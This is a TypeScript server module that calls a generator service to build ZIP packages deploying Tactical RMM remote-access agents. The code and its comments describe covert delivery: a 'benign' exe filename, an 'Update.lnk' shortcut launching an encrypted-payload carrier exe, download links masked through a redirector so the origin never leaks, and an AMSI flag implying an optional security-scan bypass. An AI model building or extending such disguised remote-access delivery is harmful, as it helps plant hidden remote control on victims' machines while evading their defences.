import "server-only";

import { env } from "./env";

export interface ZipResult {
  jobId: string;
  downloadUrl: string;
  expiresAt: string;
}

export interface CallZipGeneratorOpts {
  clientId: number;
  siteId: number;
  agentType: string; // "workstation" | "server"
  authToken: string; // the fresh 72h TRMM Deployment uid
  apiUrl: string; // TRMM base API URL — same as TRMM_API_BASE_URL
  exeUrl: string; // the deploy URL of the exe the Agent.lnk downloads at runtime
  features?: string[]; // e.g. ["rdp", "ping", "power"]
  fileName?: string; // benign exe filename — default "trmm-agent.exe"
  expiryHours: number; // 24 | 72 — the generator enforces this window
  // launcher mode (WP4): zip ships { Update.lnk, Launcher.exe } — the .lnk runs
  // the offline carrier exe directly (encrypted payload inside, nothing
  // downloaded at runtime). Absent/false = legacy Agent.lnk downloader zip.
  launcherMode?: boolean;
}

/**
 * Calls the ZIP installer generator (STAGE 2). This is the SAME Fastify service
 * as the MSI generator by default (via MSI_GENERATOR_URL/SECRET); a separate
 * ZIP_GENERATOR_URL may be pointed at a dedicated host, but the bearer secret
 * is always MSI_GENERATOR_SECRET.
 *
 * POSTs a JSON `application/json` body to `${zipGeneratorUrl}/build`, bearer
 * authenticated, 60s timeout. Success returns `{ jobId, downloadUrl,
 * expiresAt }` — `downloadUrl` is the generator-minted MASKED link (through
 * the redirector base URL) so the origin never leaks. Any failure throws; the
 * caller catches and returns a 502 (the underlying TRMM Deployment/Site are
 * not rolled back, matching the spec).
 *
 * Like the MSI path, this is only invoked when the generator is configured
 * (`env.zipGeneratorUrl` + `env.msiGeneratorSecret`); the caller checks that
 * first and returns a friendly 503 otherwise.
 */
export async function callZipGenerator(
  opts: CallZipGeneratorOpts,
): Promise<ZipResult> {
  if (!env.zipGeneratorUrl || !env.msiGeneratorSecret) {
    throw new Error(
      "ZIP generator is not configured (MSI_GENERATOR_URL / MSI_GENERATOR_SECRET not set).",
    );
  }

  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 60_000);

  try {
    const res = await fetch(`${env.zipGeneratorUrl}/build`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${env.msiGeneratorSecret}`,
      },
      body: JSON.stringify({
        exeUrl: opts.exeUrl,
        apiUrl: opts.apiUrl,
        clientId: opts.clientId,
        siteId: opts.siteId,
        agentType: opts.agentType,
        authToken: opts.authToken,
        features: opts.features ?? ["rdp", "ping", "power"],
        expiryHours: opts.expiryHours,
        ...(opts.launcherMode ? { launcherMode: true } : {}),
        flags: {
          amsi: "none", // Guardrail: AMSI default none — never a bypass by default.
          fileName: opts.fileName ?? "trmm-agent.exe",
        },
      }),
      signal: controller.signal,
    });
    const data = (await res.json().catch(() => ({}))) as Partial<ZipResult> & {
      error?: string;
    };
    if (!res.ok) {
      throw new Error(data.error ?? `ZIP generator ${res.status}`);
    }
    if (!data.downloadUrl || typeof data.downloadUrl !== "string") {
      throw new Error("ZIP generator response missing downloadUrl");
    }
    return {
      jobId: typeof data.jobId === "string" ? data.jobId : "",
      downloadUrl: data.downloadUrl,
      expiresAt:
        typeof data.expiresAt === "string"
          ? data.expiresAt
          : new Date().toISOString(),
    };
  } catch (err) {
    if (err instanceof DOMException && err.name === "AbortError") {
      throw new Error("ZIP generator timed out after 60s");
    }
    throw err;
  } finally {
    clearTimeout(timeout);
  }
}